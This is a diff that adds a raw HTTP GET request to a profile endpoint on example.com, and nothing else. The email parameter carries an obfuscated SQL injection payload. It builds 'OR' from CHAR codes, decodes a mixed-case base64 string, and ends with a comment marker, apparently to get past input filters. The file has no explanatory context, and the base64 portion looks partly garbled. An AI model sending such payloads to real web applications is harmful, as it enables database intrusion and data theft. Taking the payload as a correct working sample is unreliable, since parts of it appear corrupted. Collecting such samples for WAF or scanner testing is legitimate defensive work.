@@ -1,0 +1,6 @@
+GET /profile?email=%27%20CHAR%2879%2C82%29%20DEcODE%28%27IgfUZcAxptAgDW5pb24Gc2VszWN0IDesMIwZiC0T%27%2C%20%27basE64%27%29-- HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+
